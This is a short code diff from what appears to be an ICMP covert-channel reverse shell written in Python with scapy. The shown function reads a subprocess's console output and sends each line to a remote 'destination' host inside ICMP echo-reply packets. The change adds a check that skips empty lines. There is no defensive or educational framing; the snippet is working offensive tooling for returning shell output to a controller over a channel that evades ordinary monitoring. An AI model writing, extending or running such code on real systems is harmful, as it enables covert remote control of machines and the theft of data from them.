@@ -30,6 +30,8 @@ destination=""
 def readstdout():
     for l in iter(p.stdout.readline, b""):
         string = f'{l.decode("cp866", "backslashreplace")}'.strip()
+        if string == '':
+            continue
         reply_packet = IP(dst=destination) / ICMP(type=0, id=1515) / string
         send(reply_packet, verbose=False)
         sys.stdout.write(string)
